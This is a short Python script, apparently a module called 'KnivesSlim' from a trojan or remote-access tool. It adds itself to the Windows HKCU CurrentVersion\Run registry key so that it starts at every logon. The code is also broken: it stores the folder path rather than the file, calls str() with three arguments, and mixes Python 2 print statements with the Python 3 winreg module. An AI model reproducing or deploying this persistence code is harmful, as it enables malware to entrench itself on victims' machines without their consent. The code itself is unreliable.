import winreg
import os, getpass

# KnivesSlim (Version 0.2)

def run(**args):
	filepath = os.path.dirname(__file__) +"/"
	filename = os.path.basename(__file__)

	usr=getpass.getuser()

	print filename
	print filepath
	print usr
	print "[>] Running knives module."

	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
		r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
		0, winreg.KEY_SET_VALUE) 

	winreg.SetValueEx(key, filename, 0, winreg.REG_SZ, filepath) 

	key.Close()

	return str(filename, filepath, usr)

